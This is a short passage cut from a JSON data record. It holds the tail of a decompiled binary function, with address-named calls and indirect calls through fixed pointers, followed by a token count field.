fcn.00427390(&stack0xfffffbb4, 0, 0x400);\n        (**0x45fe30)(uVar4);\n        (**0x45fed0)(uVar3);\n        (**0x45fed0)(iVar1);\n    }\n    iStack1328 = 0x411e3f;\n    fcn.00427841(arg_8h);\n    return;\n}\n",
        "token_count": 1030
    }
}